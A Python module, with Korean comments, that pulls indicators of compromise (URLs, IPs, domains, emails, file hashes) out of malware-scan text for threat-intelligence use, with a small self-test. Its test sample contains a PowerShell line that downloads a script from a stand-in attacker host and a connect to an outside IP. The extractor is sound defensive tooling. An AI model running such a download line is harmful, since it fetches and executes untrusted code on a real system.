"""
IOC(침해지표) 추출 — URL / IPv4 / 도메인 / 이메일 / 해시(MD5·SHA-1·SHA-256).

스캔에서 나온 문자열·디코딩 코드·추출 항목에서 지표를 뽑아 OpenCTI 등 위협 인텔리전스로
넘기기 쉽게 정리한다. GUI 비의존 순수 함수.
"""

import re

_TLDS = ("com|net|org|info|biz|io|co|me|ru|cn|kr|jp|de|uk|fr|br|in|xyz|top|tk|ml|ga|cf|gq|"
         "onion|pw|cc|su|ws|club|site|online|live|app|dev|link|click|zip|mov|gov|edu|mil")

PATTERNS = {
    "url": re.compile(r"\b(?:https?|ftp)://[^\s\"'<>\\)\]}]{3,300}", re.I),
    "ipv4": re.compile(r"(?<![\d.])(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)(?![\d.])"),
    "email": re.compile(r"\b[\w.+-]{1,64}@(?:[a-z0-9-]{1,63}\.)+[a-z]{2,24}\b", re.I),
    "domain": re.compile(r"\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:%s)\b" % _TLDS, re.I),
    "sha256": re.compile(r"\b[a-f0-9]{64}\b", re.I),
    "sha1": re.compile(r"\b[a-f0-9]{40}\b", re.I),
    "md5": re.compile(r"\b[a-f0-9]{32}\b", re.I),
}

_IGNORE_IP = ("0.0.0.0", "255.255.255.255")
_IGNORE_DOMAIN = ("w3.org", "www.w3.org", "adobe.com", "ns.adobe.com", "purl.org",
                  "schemas.openxmlformats.org", "schemas.microsoft.com", "microsoft.com")


def extract_iocs(texts, exclude_hashes=(), limit=200):
    """texts: str 반복자. 반환: {종류: [정렬된 고유 값]} (빈 종류는 생략)."""
    found = {k: set() for k in PATTERNS}
    excl = {h.lower() for h in exclude_hashes if h}
    for t in texts:
        if not t:
            continue
        for kind, rx in PATTERNS.items():
            for m in rx.findall(t):
                v = m.rstrip(".,;:'\"")
                found[kind].add(v.lower() if kind in ("domain", "email") or kind.startswith(("md5", "sha")) else v)
    # 정리: 해시는 서로 길이가 다르니 그대로, 자기 파일 해시·잡음 제외
    for k in ("md5", "sha1", "sha256"):
        found[k] = {h for h in found[k] if h not in excl and not re.fullmatch(r"0+|f+", h)}
    found["ipv4"] -= set(_IGNORE_IP)
    found["domain"] = {d for d in found["domain"] if not d.endswith(_IGNORE_DOMAIN)}
    # 이메일·URL에 포함된 도메인도 도메인 목록에 남겨 둔다(피벗용) — 별도 처리 없음
    return {k: sorted(v)[:limit] for k, v in found.items() if v}


def format_iocs(iocs):
    """사람이 읽는 텍스트 블록."""
    if not iocs:
        return "IOC 없음"
    lines = []
    for k, vals in iocs.items():
        lines.append(f"[{k.upper()}] {len(vals)}개")
        lines.extend(f"  {v}" for v in vals)
    return "\n".join(lines)


if __name__ == "__main__":
    sample = ("powershell -c iwr http://evil.example.ru/a.ps1 ; connect 185.22.33.4:443 "
              "mail admin@bad-domain.top hash d41d8cd98f00b204e9800998ecf8427e v1.2.3 999.1.1.1")
    r = extract_iocs([sample])
    assert r["url"] == ["http://evil.example.ru/a.ps1"], r
    assert r["ipv4"] == ["185.22.33.4"], r
    assert "evil.example.ru" in r["domain"] and "bad-domain.top" in r["domain"], r
    assert r["email"] == ["admin@bad-domain.top"], r
    assert r["md5"] == ["d41d8cd98f00b204e9800998ecf8427e"], r
    assert extract_iocs(["x"], ) == {}
    print("ioc self-check OK")
